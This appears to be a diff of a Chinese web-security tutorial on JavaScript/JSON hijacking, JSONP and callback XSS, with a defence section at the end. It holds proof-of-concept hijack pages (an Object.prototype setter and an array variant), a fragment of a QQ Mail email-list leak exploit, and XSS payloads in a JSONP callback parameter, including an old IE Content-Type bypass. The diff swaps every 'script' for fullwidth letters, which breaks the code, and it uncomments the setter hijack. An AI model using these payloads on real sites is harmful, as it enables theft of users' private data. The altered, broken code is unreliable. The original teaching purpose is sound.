@@ -7,7 +7,7 @@ date: 2016-06-11 00:01:36
 tags:
 ---
 
-JavaScript Hijacking和CSRF很相像，唯一不同的是，CSRF是模拟你的身份去发送请求，JavaScript Hijacking是模拟你的身份，窃取你在服务器上的私隐信息。
+Javaｓｃｒｉｐｔ Hijacking和CSRF很相像，唯一不同的是，CSRF是模拟你的身份去发送请求，Javaｓｃｒｉｐｔ Hijacking是模拟你的身份，窃取你在服务器上的私隐信息。
 
 
 ## 1.攻击原理:
@@ -32,38 +32,38 @@ Json Hijacking攻击的思想见下图：
 ## 2.JSONP的介绍:
 
 为了更好的引述下面的话题，下面我借用stackoverflow上的话题来介绍一下JSONP
->JSONP is really a simple trick to overcome the XMLHttpRequest same domain policy. (As you know one cannot send AJAX (XMLHttpRequest) request to a different domain.)，So - instead >of using XMLHttpRequest we have to use script HTML tags, the ones you usually use to load js files, in order for js to get data from another domain. Sounds weird?，Thing is - >turns out script tags can be used in a fashion similar to XMLHttpRequest! Check this out:
+>JSONP is really a simple trick to overcome the XMLHttpRequest same domain policy. (As you know one cannot send AJAX (XMLHttpRequest) request to a different domain.)，So - instead >of using XMLHttpRequest we have to use ｓｃｒｉｐｔ HTML tags, the ones you usually use to load js files, in order for js to get data from another domain. Sounds weird?，Thing is - >turns out ｓｃｒｉｐｔ tags can be used in a fashion similar to XMLHttpRequest! Check this out:
 
 
 ``` 
-script = document.createElement('script');
-script.type = 'text/javascript';
-script.src = 'http://www.someWebApiServer.com/some-data';
+ｓｃｒｉｐｔ = document.createElement('ｓｃｒｉｐｔ');
+ｓｃｒｉｐｔ.type = 'text/javaｓｃｒｉｐｔ';
+ｓｃｒｉｐｔ.src = 'http://www.someWebApiServer.com/some-data';
 ``` 
-You will end up with a script segment that looks like this after it loads the data:
+You will end up with a ｓｃｒｉｐｔ segment that looks like this after it loads the data:
 ``` 
 {['some string 1', 'some data', 'whatever data']}
 ``` 
-However this is a bit inconvenient, because we have to fetch this array from script tag. So JSONPcreators decided that this will work better(and it is):
+However this is a bit inconvenient, because we have to fetch this array from ｓｃｒｉｐｔ tag. So JSONPcreators decided that this will work better(and it is):
 ```
-script = document.createElement('script');
-script.type = 'text/javascript';
-script.src = 'http://www.someWebApiServer.com/some-data?callback=my_callback';</td>
+ｓｃｒｉｐｔ = document.createElement('ｓｃｒｉｐｔ');
+ｓｃｒｉｐｔ.type = 'text/javaｓｃｒｉｐｔ';
+ｓｃｒｉｐｔ.src = 'http://www.someWebApiServer.com/some-data?callback=my_callback';</td>
 ``` 
 Notice the my_callback function over there? So - when JSONP server receives your request and finds callback parameter - instead of returning plain js array it'll return this:
 ``` 
 my_callback({['some string 1', 'some data', 'whatever data']});</td>
 ``` 
-See where the profit is: now we get automatic callback (my_callback) that'll be triggered once we get the data.That's all there is to know about JSONP: it's a callback and script tags.，NOTE: these are simple examples of JSONP usage, these are not production ready scripts.
+See where the profit is: now we get automatic callback (my_callback) that'll be triggered once we get the data.That's all there is to know about JSONP: it's a callback and ｓｃｒｉｐｔ tags.，NOTE: these are simple examples of JSONP usage, these are not production ready ｓｃｒｉｐｔs.
 ``` 
-//Basic JavaScript example (simple Twitter feed using JSONP)
+//Basic Javaｓｃｒｉｐｔ example (simple Twitter feed using JSONP)
 
 <html>
 <head>
 </head>;
 <body>;
 <div id = 'twitterFeed'></div>;
-<script>
+<ｓｃｒｉｐｔ>
 function myCallback(dataWeGotViaJsonp){
 	var text = '';
 	var len = dataWeGotViaJsonp.length;
@@ -73,8 +73,8 @@ function myCallback(dataWeGotViaJsonp){
 }
 document.getElementById('twitterFeed').innerHTML = text;
 }
-</script>
-<script type="text/javascript" src="http://twitter.com/status/user_timeline/padraicb.json?count=10&amp;callback=myCallback"></script>
+</ｓｃｒｉｐｔ>
+<ｓｃｒｉｐｔ type="text/javaｓｃｒｉｐｔ" src="http://twitter.com/status/user_timeline/padraicb.json?count=10&amp;callback=myCallback"></ｓｃｒｉｐｔ>
 </body>
 </html>
 
@@ -82,8 +82,8 @@ document.getElementById('twitterFeed').innerHTML = text;
 
 <html>
 <head>
-<script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/1.6.2/jquery.min.js"></script>
-<script>
+<ｓｃｒｉｐｔ type="text/javaｓｃｒｉｐｔ" src="https://ajax.googleapis.com/ajax/libs/jquery/1.6.2/jquery.min.js"></ｓｃｒｉｐｔ>
+<ｓｃｒｉｐｔ>
 $(document).ready(function(){
 $.ajax({
 	url: 'http://twitter.com/status/user_timeline/padraicb.json?count=10',
@@ -99,7 +99,7 @@ $('#twitterFeed').html(text);
 }
 });
 })
-</script>
+</ｓｃｒｉｐｔ>
 </head>
 <body>
 <div id = 'twitterFeed'></div>
@@ -117,18 +117,17 @@ JSONP stands for JSON with Padding. (very poorly named technique as it really 
 ** 对象的攻击方式** 
 
 ``` 
-<!--
 <html>
+...
 <body>
-<script type="text/javascript">
-//Object.prototype.__defineSetter__('Id', function(obj){alert(obj);});
-</script>
-<script src="http://example.com/Home/AdminBalances"></script>
+<ｓｃｒｉｐｔ type="text/javaｓｃｒｉｐｔ">
+Object.prototype.__defineSetter__('Id', function(obj){alert(obj);});
+</ｓｃｒｉｐｔ>
+<ｓｃｒｉｐｔ src="http://example.com/Home/AdminBalances"></ｓｃｒｉｐｔ>
 </body>
 </html>
--->
 ``` 
-其中用到了Javascript的原型，如果对Javascript的原型不够熟悉，可以参考之前的文章[《【编程语言】深刻理解javascript原型（_proto_）》](http://helloword.1kapp.com/archives/1056)
+其中用到了Javaｓｃｒｉｐｔ的原型，如果对Javaｓｃｒｉｐｔ的原型不够熟悉，可以参考之前的文章[《【编程语言】深刻理解javaｓｃｒｉｐｔ原型（_proto_）》](http://helloword.1kapp.com/archives/1056)
 
 **数组的攻击方式**
 ``` 
@@ -145,23 +144,23 @@ alert('I stole your data: ' + yourData);
 
 ``` 
 
-下面举一个实际的例子，通过构造URL让用户访问，可以获得QQ Mail的邮件列表。该漏洞由于需要在web QQ里共享QQ Mail里的邮件信息，所以QQ Mail开放了一个json接口以提供第三方的域名来获得QQ Mail的信息，但是由于该接口缺乏足够的认证，所以导致任何第三方域里都可以用script的方式来获取该邮件列表。[WooYun: QQMail邮件泄露漏洞](http://www.wooyun.org/bugs/wooyun-2010-046) 详见地址http://www.wooyun.org/bugs/wooyun-2010-046
+下面举一个实际的例子，通过构造URL让用户访问，可以获得QQ Mail的邮件列表。该漏洞由于需要在web QQ里共享QQ Mail里的邮件信息，所以QQ Mail开放了一个json接口以提供第三方的域名来获得QQ Mail的信息，但是由于该接口缺乏足够的认证，所以导致任何第三方域里都可以用ｓｃｒｉｐｔ的方式来获取该邮件列表。[WooYun: QQMail邮件泄露漏洞](http://www.wooyun.org/bugs/wooyun-2010-046) 详见地址http://www.wooyun.org/bugs/wooyun-2010-046
 
 ``` 
 var Qmail={};
-fun=passport&amp;target=MLIST&amp;t=login.js&amp;pagesize=10&amp;resp_charset=gb2312&amp;1=3"></script>
+fun=passport&amp;target=MLIST&amp;t=login.js&amp;pagesize=10&amp;resp_charset=gb2312&amp;1=3"></ｓｃｒｉｐｔ>
 alert(Qmail.newMailsList.nextUrl);
-alert(document.scripts[1].src=Qmail.newMailsList.nextUrl);
+alert(document.ｓｃｒｉｐｔs[1].src=Qmail.newMailsList.nextUrl);
 alert(Qmail.newMailsList.summary);
 ``` 
 
 ## 4.漏洞防御:
 
-因为此类漏洞为CSRF的变种，因此CSRF的防御均可以使用，详见[《【WEB安全】WEB安全基础知识系列-跨站请求伪造(CSRF)》](http://helloword.1kapp.com/archives/992)，其中重点介绍JSONP中的callback防御，在早期 JSON 出现时候，大家都没有合格的编码习惯。再输出 JSON 时，没有严格定义好 Content-Type（ Content-Type: application/json ）然后加上 callback 这个输出点没有进行过滤直接导致了一个典型的 XSS 漏洞， 举例：[http://127.0.0.1/getUsers.php?callback=<script>alert(/xss/)</script>，对于 Content-Type 来说早期还有一部分人比较喜欢使用 application/javascript而这个头在 IE 等浏览器下一样可以解析 HTML 导致 XSS 漏洞。对于这种类型的漏洞，防御主要是从两个点去部署的：
+因为此类漏洞为CSRF的变种，因此CSRF的防御均可以使用，详见[《【WEB安全】WEB安全基础知识系列-跨站请求伪造(CSRF)》](http://helloword.1kapp.com/archives/992)，其中重点介绍JSONP中的callback防御，在早期 JSON 出现时候，大家都没有合格的编码习惯。再输出 JSON 时，没有严格定义好 Content-Type（ Content-Type: application/json ）然后加上 callback 这个输出点没有进行过滤直接导致了一个典型的 XSS 漏洞， 举例：[http://127.0.0.1/getUsers.php?callback=<ｓｃｒｉｐｔ>alert(/xss/)</ｓｃｒｉｐｔ>，对于 Content-Type 来说早期还有一部分人比较喜欢使用 application/javaｓｃｒｉｐｔ而这个头在 IE 等浏览器下一样可以解析 HTML 导致 XSS 漏洞。对于这种类型的漏洞，防御主要是从两个点去部署的：
 
 ** a 严格定义 Content-Type:applicationjson **
 
-这样的防御机制导致了浏览器不解析恶意插入的 XSS 代码（直接访问提示文件下载）。但是凡事都有个案，在 IE 的进化过程中就出现过通过一些技巧绕过 Content-Type 防御解析 html ，比如在 IE6、7 等版本时请求的 URL 文件后面加一个 /x.html 就可以解析 html （ http://127.0.0.1/getUsers.php/x.html?callback=<script>alert(/xss/)</script>  ）
+这样的防御机制导致了浏览器不解析恶意插入的 XSS 代码（直接访问提示文件下载）。但是凡事都有个案，在 IE 的进化过程中就出现过通过一些技巧绕过 Content-Type 防御解析 html ，比如在 IE6、7 等版本时请求的 URL 文件后面加一个 /x.html 就可以解析 html （ http://127.0.0.1/getUsers.php/x.html?callback=<ｓｃｒｉｐｔ>alert(/xss/)</ｓｃｒｉｐｔ>  ）
 具体参考：http://hi.baidu.com/hi_heige/item/f1ecde01c4af3ed61ef04646
 
 
